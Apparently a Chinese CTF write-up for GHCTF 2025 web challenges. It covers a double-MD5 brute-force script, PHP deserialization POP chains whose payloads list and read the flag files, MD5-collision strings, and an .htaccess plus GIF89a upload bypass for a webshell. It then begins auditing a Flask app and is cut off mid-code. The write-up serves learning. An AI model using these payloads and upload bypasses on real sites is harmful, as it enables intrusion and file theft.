========== 用户配置区域 ==========</span></span><br><span class="line">TARGET_SUBSTR = <span class="string">&quot;666&quot;</span>   <span class="comment"># 要匹配的目标子串</span></span><br><span class="line">START_POS = <span class="number">0</span>           <span class="comment"># 子串的起始位置</span></span><br><span class="line">RAND_STR_LEN = <span class="number">20</span>       <span class="comment"># 随机字符串长度</span></span><br><span class="line"><span class="comment"># ================================</span></span><br><span class="line"></span><br><span class="line">CHARS = string.ascii_letters + string.digits</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmp_md5</span>(<span class="params">stop_event</span>):</span><br><span class="line">    <span class="keyword">global</span> CHARS, TARGET_SUBSTR, START_POS, RAND_STR_LEN</span><br><span class="line">    str_len = <span class="built_in">len</span>(TARGET_SUBSTR)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> stop_event.is_set():</span><br><span class="line">        rnds = <span class="string">&#x27;&#x27;</span>.join(random.choice(CHARS) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(RAND_STR_LEN))</span><br><span class="line">        <span class="comment"># 第一次MD5计算（需将字符串转为字节）</span></span><br><span class="line">        m1 = hashlib.md5(rnds.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># Python 3 需要明确编码为字节</span></span><br><span class="line">        hex1 = m1.hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hex1[START_POS:START_POS+str_len] == TARGET_SUBSTR:</span><br><span class="line">            <span class="comment"># 第二次MD5使用第一次的二进制结果</span></span><br><span class="line">            digest1 = m1.digest()</span><br><span class="line">            m2 = hashlib.md5(digest1)</span><br><span class="line">            hex2 = m2.hexdigest()</span><br><span class="line">            <span class="keyword">if</span> hex2[START_POS:START_POS+str_len] == TARGET_SUBSTR:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[Found] 原始字符串: <span class="subst">&#123;rnds&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第一次MD5: <span class="subst">&#123;hex1&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;第二次MD5: <span class="subst">&#123;hex2&#125;</span>\n&quot;</span>)</span><br><span class="line">                stop_event.<span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;开始碰撞双重MD5...&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;目标特征: &#x27;<span class="subst">&#123;TARGET_SUBSTR&#125;</span>&#x27; (起始位置: <span class="subst">&#123;START_POS&#125;</span>)&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;随机字符串长度: <span class="subst">&#123;RAND_STR_LEN&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;按 Ctrl+C 可提前终止\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    cpus = multiprocessing.cpu_count()</span><br><span class="line">    stop_event = multiprocessing.Event()</span><br><span class="line">    processes = [multiprocessing.Process(target=cmp_md5, args=(stop_event,))</span><br><span class="line">                 <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(cpus)]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.start()</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> processes:</span><br><span class="line">        p.join()</span><br><span class="line"><span class="comment">#结果：</span></span><br><span class="line"><span class="comment">#开始碰撞双重MD5...</span></span><br><span class="line"><span class="comment">#目标特征: &#x27;666&#x27; (起始位置: 0)</span></span><br><span class="line"><span class="comment">#随机字符串长度: 20</span></span><br><span class="line"><span class="comment">#按 Ctrl+C 可提前终止</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#[Found] 原始字符串: rSYwGEnSLmJWWqkEARJp</span></span><br><span class="line"><span class="comment">#第一次MD5: 666e8881ab925da651dcd5b0953f5745</span></span><br><span class="line"><span class="comment">#第二次MD5: 666d9a77a7ada5a819c7bf996a80fb        </span></span><br></pre></td></tr></table></figure><p>GlobIterator是遍历一个文件系统行为，用这个来遍历显示文件，从而找到flag</p><p><a href="https://www.php.net/manual/zh/class.globiterator.php"><font style="color:#3370FF;">GlobIterator 类 </font></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">?php</span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$GlobIterator</span>=<span class="string">&quot;/*&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">      <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;rSYwGEnSLmJWWqkEARJp&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2=<span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10=<span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?GHCTF=O:13:&quot;CherryBlossom&quot;:2:&#123;s:6:&quot;fruit1&quot;;O:13:&quot;CherryBlossom&quot;:2:&#123;s:6:&quot;fruit1&quot;;N;s:6:&quot;fruit2&quot;;O:11:&quot;Philosopher&quot;:2:&#123;s:7:&quot;fruit10&quot;;O:7:&quot;Mystery&quot;:1:&#123;s:12:&quot;GlobIterator&quot;;s:2:&quot;/*&quot;;&#125;s:7:&quot;fruit11&quot;;s:20:&quot;rSYwGEnSLmJWWqkEARJp&quot;;&#125;&#125;s:6:&quot;fruit2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495006-f7a9ad68-a053-465e-ab27-14f5266bd9eb.png"></p><p>SplFileObject 类为文件提供了一个面向对象接口，直接读取flag</p><p><a href="https://www.php.net/manual/zh/class.splfileobject.php#class.splfileobject"><font style="color:#3370FF;">SplFileObject类</font></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CherryBlossom</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit1</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit2</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;fruit1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="variable">$newFunc</span> = <span class="variable language_">$this</span>-&gt;fruit2;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newFunc</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mystery</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$SplFileObject</span>=<span class="string">&quot;/flag44545615441084&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg1</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">array_walk</span>(<span class="variable">$this</span>, function (<span class="variable">$day1</span>, <span class="variable">$day2</span>) &#123;</span><br><span class="line">      <span class="variable">$day3</span> = <span class="keyword">new</span> <span class="variable">$day2</span>(<span class="variable">$day1</span>);</span><br><span class="line">      <span class="keyword">foreach</span> (<span class="variable">$day3</span> <span class="keyword">as</span> <span class="variable">$day4</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$day4</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Philosopher</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit10</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$fruit11</span>=<span class="string">&quot;rSYwGEnSLmJWWqkEARJp&quot;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;fruit11)) == <span class="number">666</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;fruit10-&gt;hey;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1=<span class="keyword">new</span> <span class="title class_">CherryBlossom</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2=<span class="keyword">new</span> <span class="title class_">Philosopher</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;fruit1-&gt;fruit2-&gt;fruit10=<span class="keyword">new</span> <span class="title class_">Mystery</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$c</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?GHCTF=O:13:&quot;CherryBlossom&quot;:2:&#123;s:6:&quot;fruit1&quot;;O:13:&quot;CherryBlossom&quot;:2:&#123;s:6:&quot;fruit1&quot;;N;s:6:&quot;fruit2&quot;;O:11:&quot;Philosopher&quot;:2:&#123;s:7:&quot;fruit10&quot;;O:7:&quot;Mystery&quot;:1:&#123;s:13:&quot;SplFileObject&quot;;s:19:&quot;/flag44545615441084&quot;;&#125;s:7:&quot;fruit11&quot;;s:20:&quot;rSYwGEnSLmJWWqkEARJp&quot;;&#125;&#125;s:6:&quot;fruit2&quot;;N;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495240-8b72fb9f-20a2-4b28-ae37-7e330cd9574a.png"></p><h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><p>题目是a和b原来的值不相等而md5的值相等</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495475-e6634ee0-61ed-4214-aad8-6b5765823d84.png"></p><p>所以使用fastcoll来跑</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464495727-f65b813d-8214-41e8-854d-c9921c2a78d6.png"></p><p>绕过成功</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496070-d4c14553-6851-413d-a08b-16374437857d.png"></p><p>看了wp：在php出题模版中，有⼀个容器启动命令文件docker-entrypoint.sh。可以看到该命令⽂件在容器初 </p><p>始化后就会被删掉。但是在提交⽣成镜像后，由镜像⽣成容器⼜需要运⾏该⽂件。因此有的出题者为了 </p><p>⽅便可能就不删除该⽂件，这时候就可以碰碰运⽓，看看出题者有没有把这个⽂件删掉。没有删掉，就 </p><p>能够获取路径。</p><p>所以接下来对docker-entrypoint.sh入手，成功</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496315-f7fe9f81-2bdc-4b6e-96a0-0121a6913574.png"></p><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/f1wlxekj1lwjek1lkejzs1lwje1lwesjk1wldejlk1wcejl1kwjelk1wjcle1jklwecj1lkwcjel1kwjel1cwjl1jwlkew1jclkej1wlkcj1lkwej1lkcwjellag</span><br></pre></td></tr></table></figure><p>得到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496588-7f24fe53-516f-4a56-b787-2341cc89f269.png"></p><p>看了一份大佬的wp，这两个字符串也能达到同样的效果，学到了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=TEXTCOLLBYfGiJUETHQ4hEcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span><br><span class="line">b=TEXTCOLLBYfGiJUETHQ4hAcKSMd5zYpgqf1YRDhkmxHkhPWptrkoyz28wnI9V0aHeAuaKnak</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464496883-b4ad3da3-9580-48fe-8900-bc25f5fc510f.png"></p><p>学到了学到了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497162-b8e8df16-edcc-489b-97a3-f65372b40d66.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497410-6fe9a642-eab8-46ac-aa95-cda1bb4dfead.png"></p><h2 id="UPUPUP"><a href="#UPUPUP" class="headerlink" title="UPUPUP"></a>UPUPUP</h2><p>参考文章：<a href="https://blog.csdn.net/yeyushengfano/article/details/146245007"><font style="color:#3370FF;">GHCTF2025-WEB新手向详解-UP UP UP！</font></a></p><p>进入靶场</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497656-24d0c457-6425-4c37-aff0-9d678adaa603.png"></p><p>先爆破一下可以使用的文件其中GIF89a，是常见的图片文件幻术头GIF89a</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464497948-3a1287c6-881d-45e8-ab4d-1df2734a1f42.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498235-e4656aba-c0ce-4a99-9480-307606244bdd.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498496-b0830cd3-0df6-4dd4-a163-bca0239d0297.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464498826-de81b044-6606-4f00-a52e-7862d1526c52.png"></p><p>几个示例下来发现php,phpml是不行的并且不区分大小写，也就是说直接上传一句话木马的php文件是不行的，而jpg,html文件是可行的，之后又加了.png和.htaccess文件都能成功，所以接下来从这个思路入手。</p><p>所以编辑.htaccess文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499052-c1095ce8-83be-45ec-a495-953170272cc2.png"></p><p>写upload.jpg文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499216-77627e07-d735-4726-b182-6c792142014f.png"></p><p><font style="color:#8F959E;"></font></p><p>分别在靶场上传.htaccess和upload.jpg（改包上传也行），之后访问upload.jpg检查是否成功</p><p>若出现这样的界面出现php报错，说明这个php代码已经执行成功了，这样也就上传成功了，可以蚁剑连接了</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499429-7bb91967-ad31-4ee0-a9c5-37bb3c164560.png"></p><p>hhhhhh，这些爆破测试用的文件都在这里</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499698-06627e42-0932-4306-b03f-addee3cdad33.png"></p><p>找到flag</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464499939-3f6f7fba-ba3a-452d-ab6d-63b2522dbdaa.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500143-681419cf-229a-48f4-bb8d-b3463c3b22ed.png"></p><p>学到的知识（早读在背了）：</p><p>GIF89a的知识： </p><p>一个GIF89a图形文件就是一个根据图形交换格式（GIF）89a版（1989年7 月发行）进行格式化之后的图形。在GIF89a之前还有87a版（1987年5月发行），但在Web上所见到的大多数图形都是以89a版的格式创建的。 89a版的一个最主要的优势就是可以创建动态图像，例如创建一个旋转的图标、用一只手挥动的旗帜或是变大的字母。特别值得注意的是，一个动态GIF是一个 以GIF89a格式存储的文件，在一个这样的文件里包含的是一组以指定顺序呈现的图片。GIF89a是 GIF 动画和透明效果的技术基础，它的存在表明文件支持更高级的功能。</p><p>攻击者可在恶意文件（如 PHP、HTML、SSRF Payload）开头插入GIF89a头，伪装成合法 GIF 文件，绕过文件类型检测，以达到攻击的目的</p><p>关于.htaccess文件（deepseek生成）：</p><p>在 CTF Web 题目中，.htaccess文件是 Apache 服务器的配置文件，通常用于控制目录级别的服务器行为。攻击者可通过篡改或上传该文件实现 权限绕过、代码执行、路径劫持 等攻击。以下是其核心作用及典型利用场景：</p><p>重写 URL（Rewrite Rules）：通过 RewriteEngine 和 RewriteRule 修改请求路径，常用于隐藏真实文件路径或实现伪静态化。</p><p>设置文件类型解析：使用 AddType 或 AddHandler 强制服务器将特定文件（如 .jpg）解析为动态脚本（如 PHP）。</p><p>权限控制：限制目录访问（Deny&#x2F;Allow）、IP 过滤、密码保护等。</p><p>自定义错误页面：通过 ErrorDocument 定义错误响应（如 404 页面）。</p><p>包含其他文件：利用 php_value auto_prepend_file 包含恶意代码。</p><p>.xbm和.wbmp文件幻术头为.htaccess的注释符的检测绕过：</p><p><a href="https://blog.csdn.net/qq_45570082/article/details/108910162"><font style="color:#3370FF;">php 文件上传.htaccess getimagesize和exif_imagetype绕过</font></a></p><p>.htaccess中的注释符有：  \x00  和  #，而有两种不常见的图片类型文件.xbm和.wbmp，其文件幻术头正是以这些注释符作为开头。</p><p>.xbm图片的文件幻术头为：</p><p>#define width 1337</p><p>#define height 1337</p><p>.wbmp图片的文件幻术头为：</p><p>\x00\x00\x85\x85 或者 \x00\x00\x8a\x39\x8a\x39</p><h2 id="GHCTF-2025-Goph3rrr"><a href="#GHCTF-2025-Goph3rrr" class="headerlink" title="[GHCTF 2025]Goph3rrr"></a>[GHCTF 2025]Goph3rrr</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500464-b736d11b-bcc7-4fee-badd-1deef3528ccd.png"></p><p>扫目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500776-f71c8830-69f9-42c9-b583-87742b086b59.png"></p><p>有个app.py的目录</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464500918-6a2f1f8b-9eef-459b-9476-bf6d4e1dc2bc.png"></p><p>下载了一个文件</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501121-c34c4dc3-a511-43f9-bd7b-918d77506f24.png"></p><p>wc一堆base64</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501554-53ad4b6c-e944-4507-942a-0842ce396922.png"></p><p>尝试解码,但是失败了,分析一下,前面的PNG应该代表这是一个由base64进行编码的二进制图片吧就是靶场显示的那张,我猜的</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464501862-73cb61ee-4a77-4e68-8174-0d5692b37b70.png"></p><p>试着本地运行一下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502322-44dd6d76-d1bc-4de1-b101-30b3d7b26a06.png"></p><p>确实</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/50616406/1746464502674-f03583db-c234-4807-8906-194ad3d01d5c.png"></p><p>审计app.py代码</p><p>flask框架</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, send_file, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunparse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">BlackList = [</span><br><span class="line">    <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>下载app.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app.py&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_source</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(__file__, as_attachment=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>根目录,生成图片,原base64编码的就不写了,省空间</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">return &#x27;&#x27;&#x27;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line">      body &#123;</span><br><span class="line">        background-image: url(&#x27;data:image/png;base64,</span><br><span class="line">          //[原base64,为了省空间就不写了]</span><br><span class="line">          ); /* 背景图像 */</span><br><span class="line">        background-size: cover; /* 背景图片覆盖整个页面 */</span><br><span class="line">        height: 100vh; /* 页面高度填满浏览器窗�? */</span><br><span class="line">        display: flex;</span><br><span class="line">        justify-content: center; /* 水平居中 */</span><br><span class="line">        align-items: center; /* 垂直居中 */</span><br><span class="line">        color: white; /* 字体颜色 */</span><br><span class="line">        font-family: Arial, sans-serif; /* 字体 */</span><br><span class="line">        text-align: center; /* 文字居中 */</span><br><span class="line">      &#125;</span><br><span class="line">      h1 &#123;</span><br><span class="line">        font-size: 50px;</span><br><span class="line">        transition: transform 0.2s ease-in-out; /* 设置浮动效果过渡时间 */</span><br><span class="line">      &#125;</span><br><span class="line">      h1:hover &#123;</span><br><span class="line">        transform: translateY(-10px); /* 向上浮动 */</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello Ctfer!!! Welcome to the GHCTF challenge! (≧∇�?)<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span 